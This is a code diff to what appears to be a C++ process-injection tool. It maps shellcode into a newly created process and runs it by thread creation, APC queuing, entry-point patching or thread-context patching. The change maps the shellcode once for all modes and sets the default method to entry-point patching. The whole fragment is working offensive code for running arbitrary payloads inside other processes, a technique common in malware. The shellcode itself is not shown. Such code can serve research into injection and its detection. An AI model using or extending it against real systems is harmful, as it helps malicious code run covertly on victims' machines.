@@ -81,24 +81,21 @@ bool inject_in_new_process(INJECTION_POINT mode)
     if (create_new_process2(pi, cmdLine, startDir) == false) {
         return false;
     }
-    LPVOID remote_shellcode_ptr = NULL;
+    LPVOID remote_shellcode_ptr = map_code_into_process(pi.hProcess, g_Shellcode, sizeof(g_Shellcode));
     switch (mode) {
     case ADD_THREAD:
-        remote_shellcode_ptr = map_code_into_process(pi.hProcess, g_Shellcode, sizeof(g_Shellcode));
         run_shellcode_in_new_thread(pi.hProcess, remote_shellcode_ptr, THREAD_CREATION_METHOD::usingRandomMethod);
         // not neccessery to resume the main thread
         break;
     case ADD_APC:
-        remote_shellcode_ptr = map_code_into_process(pi.hProcess, g_Shellcode, sizeof(g_Shellcode));
         add_shellcode_to_apc(pi.hThread, remote_shellcode_ptr);
         ResumeThread(pi.hThread); //resume the main thread
         break;
     case PATCH_EP:
-        paste_shellcode_at_ep(pi.hProcess, g_Shellcode, sizeof(g_Shellcode));
+        paste_shellcode_at_ep(pi.hProcess, remote_shellcode_ptr);
         ResumeThread(pi.hThread); //resume the main thread
         break;
     case PATCH_CONTEXT:
-        remote_shellcode_ptr = map_code_into_process(pi.hProcess, g_Shellcode, sizeof(g_Shellcode));
         patch_context(pi.hThread, remote_shellcode_ptr);
         ResumeThread(pi.hThread); //resume the main thread
         break;
@@ -134,7 +131,7 @@ int main()
     if (inject_in_existing_process()) {
         printf("[SUCCESS] Code injected in existing process!\n");
     } else {
-        if (inject_in_new_process(INJECTION_POINT::PATCH_CONTEXT)) {
+        if (inject_in_new_process(INJECTION_POINT::PATCH_EP)) {
              printf("[SUCCESS] Code injected in a new process!\n");
         }
     }
